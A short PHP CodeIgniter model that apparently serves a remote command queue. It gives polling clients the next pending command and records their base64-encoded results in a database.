<?php

class Client_command_model extends CI_Model{
	function __construct(){
		parent::__construct();
	}
    
    function get_command(){
        $sql = 'select id,command from `command` where status = 0 order by id limit 1';
        $query = $this->db->query($sql);
        $command = $query->row_array();
        if(!empty($command)){            
            return $command['id'].':'.$command['command'];
        }
        else{
            return 'noCommand';
        }
    }
    
    function reply_command($result){
        $command_id = substr($result,0,strpos($result,':'));
        $command_result = base64_decode(substr($result,strpos($result,':') + 1));
        
        $sql = 'select count(*) from command where id = ? and status = 0';
        $query = $this->db->query($sql,array($command_id));
        $count = $query->row_array();
        
        if($count['count(*)'] == 0){
            return -1;
        }
        else{
            $sql = 'insert into result(result) values(?)';
            $this->db->query($sql,array($command_result));
            
            $sql = 'select id from `result` order by id desc limit 1';
            $query = $this->db->query($sql);
            $result_id = $query->row_array();
            
            $sql = 'update command set status = ? , result_id =? where id = ?';
            $this->db->query($sql,array(1,$result_id['id'],$command_id));
            return 1;
        }
    }
}
?>